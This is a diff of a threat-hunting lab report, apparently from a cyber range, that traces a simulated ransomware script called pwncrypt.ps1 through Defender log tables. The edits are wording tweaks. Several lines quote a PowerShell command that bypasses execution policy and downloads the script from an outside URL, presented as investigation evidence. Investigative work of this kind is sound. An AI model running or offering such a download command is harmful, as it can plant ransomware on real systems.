@@ -67,8 +67,8 @@ I next checked the DeviceProcessEvents table in order to determine how the files
 - Additionally, the `InitiatingProcessCommandLine` table revealed the script that was run:
   - `powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1`
     - The command opens PowerShell, tells it to ignore all safety settings(`ExecutionPolicy Bypass `),
-    - then downloads a suspicious script called pwncrypt.ps1 from the internet(`Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1`)
-    - and saves it in a system folder(`C:\ProgramData\pwncrypt.ps1`)
+    - Then downloads a suspicious script called pwncrypt.ps1 from the internet(`Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1`)
+    - Finally saves it in a system folder(`C:\ProgramData\pwncrypt.ps1`)
 
 **Query used to locate event:**
 
@@ -125,7 +125,7 @@ DeviceNetworkEvents
 - **Action:** `pwncrypt.ps1` downloaded from an external GitHub repository and executed on the machine.
 - **File Path:** `C:\Users\Public\Downloads\pwncrypt.ps1`
 - **Process Path:** `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
-- **Command:** `powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\Downloads\pwncrypt.ps1`
+- **Command:** `powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1`
 
 ### 2. File Creation - Encrypted Files (pwncrypt.csv)
 
